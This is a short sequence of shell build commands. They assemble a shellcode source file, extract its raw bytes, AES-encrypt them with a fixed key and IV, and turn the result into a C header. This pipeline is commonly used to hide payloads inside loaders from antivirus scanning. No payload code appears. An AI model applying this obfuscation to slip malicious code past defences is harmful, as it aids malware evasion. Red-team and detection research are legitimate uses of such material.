as --64 shellcode.s -o shellcode.o
ld -N -o shellcode.elf shellcode.o
objcopy -O binary shellcode.elf shellcode.raw
openssl enc -aes-128-cbc -nosalt -e -in shellcode.raw -out shellcode.enc -K '2b7e151628aed2a6abf7158809cf4f3c' -iv '000102030405060708090a0b0c0d0e0f'
xxd -i shellcode.enc shellcode_hex.h
